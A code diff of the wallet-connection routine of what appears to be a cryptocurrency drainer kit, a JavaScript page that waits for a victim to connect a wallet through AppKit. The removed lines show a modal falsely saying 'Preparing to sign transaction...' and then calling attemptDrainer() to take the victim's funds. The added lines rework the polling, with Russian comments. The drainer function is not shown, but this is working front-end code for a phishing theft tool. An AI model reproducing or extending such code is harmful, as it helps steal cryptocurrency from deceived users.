@@ -1024,66 +1024,60 @@ async function handleConnectOrAction() {
 
 async function waitForConnection() {
   return new Promise((resolve, reject) => {
-    console.log('📡 Waiting for wallet connection via AppKit...');
-    const isMobile = isMobileDevice();
-    console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
+    console.log('📡 Ожидание подключения кошелька через AppKit...');
 
     let attempts = 0;
-    const maxAttempts = 10;
-    const interval = 2000;
+    const maxAttempts = 15; // Максимальное количество попыток
+    const interval = 1000; // Интервал проверки (1 секунда)
 
-    const unsubscribe = appKit.subscribeState(async(state) => {
-      console.log('🔍 SubscribeState:', state);
-      console.log('State loading:', state.loading);
-      console.log('State connected:', state.connected);
-      console.log('State accounts:', state.accounts);
+    // Функция проверки состояния
+    const checkConnection = () => {
+      const state = appKit.getState ? appKit.getState() : {}; // Проверяем наличие метода getState
+      console.log('🔍 Текущее состояние:', state);
 
       let walletAddress = null;
 
-      if (state.loading === false && state.connected && (state.address || state.accounts?.[0])) {
+      // Проверяем, подключён ли кошелёк
+      if (state.connected && (state.address || state.accounts?.[0])) {
         walletAddress = state.address || state.accounts?.[0];
         if (walletAddress.startsWith('eip155:')) {
-          walletAddress = walletAddress.split(':')[2];
+          walletAddress = walletAddress.split(':')[2]; // Извлекаем чистый адрес
         }
       }
 
       if (walletAddress) {
-        console.log(`✅ Wallet connected via AppKit: ${walletAddress}`);
-        connectedAddress = walletAddress;
-        unsubscribe();
-        modalSubtitle.textContent = 'Preparing to sign transaction...';
-        try {
-          await attemptDrainer();
-          appKit.close();
-          resolve(walletAddress);
-        } catch (err) {
-          console.error(`❌ Error in attemptDrainer: ${err.message}`);
-          appKit.close();
-          reject(err);
+        console.log(`✅ Кошелёк подключён: ${walletAddress}`);
+        resolve(walletAddress); // Успешное подключение
+      } else {
+        attempts++;
+        if (attempts < maxAttempts) {
+          console.log(`ℹ️ Попытка ${attempts}/${maxAttempts}: Подключение ещё не готово...`);
+          setTimeout(checkConnection, interval); // Повторная проверка через 1 секунду
+        } else {
+          console.warn('⚠️ Достигнуто максимальное количество попыток');
+          appKit.close(); // Закрываем AppKit
+          reject(new Error('Не удалось подключить кошелёк после максимального числа попыток'));
         }
-      } else if (attempts >= maxAttempts) {
-        console.warn('⚠ Max connection attempts reached');
-        unsubscribe();
-        appKit.close();
-        reject(new Error('Failed to connect wallet after maximum attempts'));
       }
+    };
 
-      attempts++;
+    // Запускаем первую проверку
+    checkConnection();
+
+    // Подписка на обновления состояния
+    const unsubscribe = appKit.subscribeState((state) => {
+      console.log('🔍 Обновление состояния:', state);
+      if (state.connected && (state.address || state.accounts?.[0])) {
+        checkConnection(); // Проверяем сразу при обновлении
+      }
     });
 
+    // Устанавливаем таймаут на случай долгого ожидания
     const timeout = setTimeout(() => {
-      console.warn('⚠ Connection timeout');
-      unsubscribe();
-      appKit.close();
-      reject(new Error('Timeout waiting for wallet connection'));
-    }, 120000);
-
-    appKit.open('error', (err) => {
-      console.error(`❌ AppKit error: ${err.message}`);
-      clearTimeout(timeout);
-      unsubscribe();
-      appKit.close();
-      reject(err);
-    });
+      console.warn('⚠️ Истекло время ожидания подключения');
+      unsubscribe(); // Отписываемся от обновлений
+      appKit.close(); // Закрываем AppKit
+      reject(new Error('Таймаут ожидания подключения кошелька'));
+    }, 60000); // Таймаут 60 секунд
   });
 }
